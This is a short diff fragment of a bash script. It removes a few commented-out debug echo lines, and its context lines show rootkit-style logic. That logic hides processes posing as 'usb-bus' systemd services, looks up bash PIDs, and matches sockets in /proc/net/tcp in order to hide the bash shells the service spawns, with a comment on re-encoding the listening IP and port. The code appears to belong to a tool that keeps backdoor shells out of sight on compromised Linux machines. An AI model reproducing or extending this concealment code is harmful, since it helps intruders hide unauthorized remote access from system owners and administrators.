@@ -438,8 +438,6 @@ while true; do
 
 #hide /bin/bash/bin/usb-bus and /bin/bash/sbin/usb-bus, which are our systemd services
 bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }') 
-#echo "bash_pid"
-#echo "$bash_pid"
 while read hide_pid; do
 	cmdline=$(cat /proc/$hide_pid/cmdline)
 	cat /proc/$hide_pid/cmdline &>/dev/null
@@ -455,8 +453,6 @@ done <<<$bash_pid
 #hide bash shells which our systemd service spawns
 inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }') #(AAA) change 0100007F:270F according to the listening ip and port (use ip to hex converter from the internet, revert the 
 #resulting hex and use it (without the 0x) in place of 0100007F, then convert the port from decimal to hex and use it in place of 270F)
-#echo "inode_list"
-#echo "$inode_list"
 for (( i=1; i <= 65553; i=i+1 )); do
 	if [ "${hidden_pids[i]}" != "" ]; then
 		#echo "$i already on hidden_pids"
